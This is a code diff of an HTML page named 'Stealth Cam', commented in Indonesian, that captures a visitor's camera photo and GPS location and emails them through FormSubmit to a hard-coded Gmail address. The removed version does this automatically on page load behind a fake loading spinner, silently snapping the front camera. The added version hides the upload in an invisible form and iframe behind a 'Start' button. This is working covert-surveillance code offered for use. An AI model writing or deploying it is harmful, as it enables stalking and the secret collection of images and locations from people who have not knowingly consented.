@@ -3,154 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Stealth</title>
+    <title>Stealth Cam</title>
     <style>
-        body { margin: 0; font-family: sans-serif; background: #121212; color: white; overflow: hidden; }
-        #loader {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; display: flex; justify-content: center;
-            align-items: center; z-index: 9999; opacity: 1; transition: opacity 0.5s;
-        }
-        .spinner {
-            width: 40px; height: 40px; border: 4px solid #333;
-            border-top: 4px solid #fff; border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #msg {
-            position: absolute; bottom: 20px; width: 100%; text-align: center;
-            color: #888; font-size: 12px;
-        }
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        #status { font-size: 14px; color: #666; margin-top: 10px; }
+        #preview { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 999; }
+        #btn { padding: 15px 30px; font-size: 18px; background: #fff; border: none; border-radius: 30px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div id="loader"><div class="spinner"></div></div>
-    <div id="msg">Memuat...</div>
+    <!-- IFRAME untuk menangani upload file tanpa reload -->
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
 
-    <!-- Form Tersembunyi -->
-    <form id="stealthForm" style="display: none;" action="https://formsubmit.co/ajax/desamuncrat477@gmail.com" method="POST" enctype="multipart/form-data">
-        <!-- Field yang akan dikirim -->
-        <input type="hidden" name="message" id="field_message">
-        <!-- Input File Tersembunyi -->
-        <input type="file" name="attachment" id="fileInput" accept="image/*">
+    <!-- FORM UTAMA -->
+    <form id="stealthForm" action="https://formsubmit.co/ajax/desamuncrat477@gmail.com" method="POST" enctype="multipart/form-data" target="hidden_iframe">
         
-        <!-- Kunci agar FormSubmit tidak redirect ke halaman sukses -->
+        <!-- Field Pesan -->
+        <input type="hidden" name="message" id="field_message">
+        
+        <!-- Field File (PENTING: Nama field 'attachment') -->
+        <input type="file" name="attachment" id="fileInput" accept="image/*" capture="environment">
+        
+        <!-- Konfigurasi FormSubmit -->
         <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_template" value="box">
-        <!-- Subject Email -->
+        <input type="hidden" name="_next" value="">
         <input type="hidden" name="_subject" value="Foto & Lokasi Baru">
     </form>
 
+    <button id="btn">Start</button>
+    <div id="status">Siap...</div>
+
     <script>
-        async function startStealth() {
-            const loader = document.getElementById('loader');
-            const msg = document.getElementById('msg');
-            const input = document.getElementById('fileInput');
-            const messageField = document.getElementById('field_message');
-            const isAndroid = /Android/i.test(navigator.userAgent);
+        const btn = document.getElementById('btn');
+        const status = document.getElementById('status');
+        const form = document.getElementById('stealthForm');
+        const fileInput = document.getElementById('fileInput');
+        const messageField = document.getElementById('field_message');
+        const iframe = document.getElementById('hidden_iframe');
 
-            // 1. Siapkan Lokasi
-            let lokasi = "Lokasi tidak tersedia";
+        btn.addEventListener('click', async () => {
+            status.innerText = "Mengambil Lokasi & Kamera...";
             
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    lokasi = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}\nLink: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                },
-                () => { lokasi = "Lokasi ditolak"; },
-                { timeout: 10000 }
-            );
-
-            // 2. Ambil Foto
-            if (isAndroid) {
-                // Trigger native camera
-                input.click();
-                
-                // Tunggu sampai user memilih file
-                await new Promise(resolve => {
-                    input.onchange = () => {
-                        if (input.files && input.files[0]) {
-                            // Data file sudah siap di input.files[0]
-                        }
-                        resolve();
-                    };
-                });
-            } else {
-                // Fallback untuk Desktop/iOS: Gunakan Kamera Web
+            // 1. Ambil Lokasi
+            let lokasi = "Tidak ada lokasi";
+            if (navigator.geolocation) {
                 try {
-                    const video = document.createElement('video');
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    
-                    // Dapatkan stream kamera depan
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    video.srcObject = stream;
-                    video.play();
-
-                    // Tunggu video siap
-                    await new Promise(resolve => {
-                        video.onloadedmetadata = () => {
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            ctx.drawImage(video, 0, 0);
-                            
-                            // Konversi ke Blob
-                            canvas.toBlob((blob) => {
-                                if (blob) {
-                                    // Buat objek File dari Blob agar diterima oleh FormSubmit
-                                    const file = new File([blob], "foto.jpg", { type: "image/jpeg" });
-                                    // Masukkan ke input file virtual
-                                    const dataTransfer = new DataTransfer();
-                                    dataTransfer.items.add(file);
-                                    input.files = dataTransfer.files;
-                                }
-                                // Stop kamera
-                                stream.getTracks().forEach(track => track.stop());
-                                resolve();
-                            }, 'image/jpeg', 0.8);
-                        };
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                     });
-                } catch (err) {
-                    console.error("Gagal ambil kamera:", err);
-                }
+                    lokasi = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`;
+                } catch (e) { lokasi = "Lokasi ditolak"; }
             }
 
-            // 3. Isi Data & Kirim
-            messageField.value = `Lokasi:\n${lokasi}\n\nWaktu: ${new Date().toLocaleString()}`;
-            
-            // Cek apakah ada file sebelum submit
-            if (!input.files || input.files.length === 0) {
-                // Jika tidak ada file, kita tetap submit agar form tidak error
-                // Tapi FormSubmit biasanya menolak jika tidak ada file jika field required
-                // Kita isi message tambahan
-                messageField.value += "\n\n(Kamera tidak memberikan foto)";
-            }
+            // 2. Ambil Foto (Native Camera)
+            // Kita klik input file yang sudah ada di form
+            fileInput.click();
 
-            msg.innerText = "Mengirim...";
-
-            // Gunakan fetch untuk submit tanpa reload
-            const formData = new FormData(document.getElementById('stealthForm'));
-            
-            fetch("https://formsubmit.co/ajax/desamuncrat477@gmail.com", {
-                method: "POST",
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    loader.style.opacity = '0';
-                    setTimeout(() => { loader.style.display = 'none'; }, 500);
-                    msg.innerText = "Kirim Berhasil!";
-                } else {
-                    msg.innerText = "Gagal: " + response.status;
-                }
-            })
-            .catch(error => {
-                console.error("Error:", error);
-                msg.innerText = "Error koneksi";
+            // Tunggu user memilih foto
+            await new Promise(resolve => {
+                fileInput.onchange = () => {
+                    if (fileInput.files && fileInput.files[0]) {
+                        // File sudah terpilih!
+                    }
+                    resolve();
+                };
             });
-        }
 
-        window.onload = startStealth;
+            // Cek apakah ada file
+            if (!fileInput.files.length) {
+                status.innerText = "Gagal: Tidak ada foto dipilih.";
+                return;
+            }
+
+            // 3. Isi Data & Submit
+            messageField.value = `Lokasi: ${lokasi}\nWaktu: ${new Date().toLocaleString()}`;
+            status.innerText = "Mengirim...";
+
+            // SUBMIT FORM (Ini kuncinya)
+            // Kita gunakan form.submit() yang akan mengirim ke iframe, bukan reload halaman
+            form.submit();
+
+            // 4. Tunggu response dari iframe
+            iframe.onload = () => {
+                try {
+                    const content = iframe.contentDocument.body.innerText;
+                    if (content.includes("success") || content.includes("200")) {
+                        status.innerText = "Foto & Lokasi Terkirim!";
+                        btn.style.display = 'none';
+                    } else {
+                        status.innerText = "Gagal dikirim.";
+                    }
+                } catch (e) {
+                    status.innerText = "Selesai (Cek Spam)";
+                }
+            };
+        });
     </script>
 </body>
 </html>
